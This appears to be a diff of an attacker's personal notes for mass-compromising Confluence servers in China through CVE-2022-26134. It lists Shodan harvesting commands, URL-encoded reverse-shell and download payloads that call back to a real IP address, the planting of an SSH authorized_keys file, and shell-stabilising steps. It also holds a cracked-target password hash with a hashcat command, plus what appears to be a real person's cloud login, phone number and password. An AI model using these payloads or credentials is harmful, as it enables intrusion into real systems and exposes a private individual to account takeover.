@@ -1,2 +1,31 @@
-shodan download --limit 10 myresults.json.gz 'country:"CN"' confluence
+shodan + CVE-2022-26134 = 批量拿站
+
+shodan download  --limit -1 myresults.json.gz 'country:"CN"' confluence 
+shodan parse --fields ip_str,port --separator : myresults.json.gz
+
 bash%20-i%20>&%20/dev/tcp/35.236.161.97/80%200>&1
+wget%2035.236.161.97/reverse1.sh
+wget%2035.236.161.97/reverse2.sh
+chmod%20777%20reverse1.sh
+chmod%20777%20reverse2.sh
+
+wget%2035.236.161.97/authorized_keys%20-O%20
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+ctrl+z
+stty raw -echo && fg
+enter
+stty rows 45 && stty columns 172 && export TERM=xterm
+export TERM=xterm
+
+
+ {PKCS5S2}bytl0FWLk8AYlRqICuu0yF2dK4mfLPMaF4ca7flzAGD87xs4JNsMbaIhVUrzyi1x
+
+
+./hashcat  /Users/timmy/github/timmy/Shodan/confluence/hash.txt /Users/timmy/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt  -O --force
+
+
+阿里云登录帐号:ciyiyy
+手机号：15389054975
+密码：cyyy8821@
